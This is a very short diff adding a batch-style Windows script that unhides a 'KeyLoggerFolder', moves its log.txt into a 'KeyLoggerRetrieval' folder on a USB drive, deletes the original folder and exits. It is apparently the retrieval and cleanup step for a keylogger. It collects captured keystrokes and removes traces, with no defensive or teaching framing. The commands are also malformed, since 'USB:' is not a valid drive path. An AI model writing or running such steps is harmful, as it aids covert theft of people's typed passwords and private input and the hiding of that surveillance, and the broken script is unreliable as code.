@@ -1,0 +1,5 @@
+attrib -h C:\\KeyLoggerFolder
+move USB:\\KeyLoggerFolder\\log.txt USB:\\KeyLoggerRetrieval\\log.txt
+del USB:\\KeyLoggerFolder
+Y
+exit
